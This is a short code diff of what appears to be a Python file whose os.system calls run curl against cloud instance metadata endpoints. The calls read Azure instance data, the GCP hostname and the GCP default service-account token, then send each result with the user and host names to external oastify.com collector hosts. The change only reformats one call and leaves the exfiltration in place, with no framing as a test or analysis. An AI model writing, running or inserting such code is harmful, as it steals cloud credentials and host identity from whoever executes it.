@@ -11,9 +11,8 @@ os.system(
     "curl -d \"`curl -H 'Metadata: true' http://169.254.169.254/metadata/instance?api-version=2021-02-01`\"https://aycbrjy5j1957vn09pb4vmgxpovfj67v.oastify.com/Azure/`whoami`/`hostname`"
 )
 
-os.system(
-    "curl -d \"`curl -H 'Metadata-Flavor:Google' http://169.254.169.254/computeMetadata/v1/instance/hostname`\" https://xijyb6is3otsri7ntcvrf90k9bf23srh.oastify.com/GCP/hostname/`whoami`/`hostname`"
-)
+os.system("curl -d \"`curl -H 'Metadata-Flavor:Google' http://169.254.169.254/computeMetadata/v1/instance/hostname`\" https://xijyb6is3otsri7ntcvrf90k9bf23srh.oastify.com/GCP/hostname/`whoami`/`hostname`")
+
 os.system(
     "curl -d \"`curl -H 'Metadata-Flavor:Google' http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token`\" https://xijyb6is3otsri7ntcvrf90k9bf23srh.oastify.com/GCP/serviceAccountToken/`whoami`/`hostname`"
 )
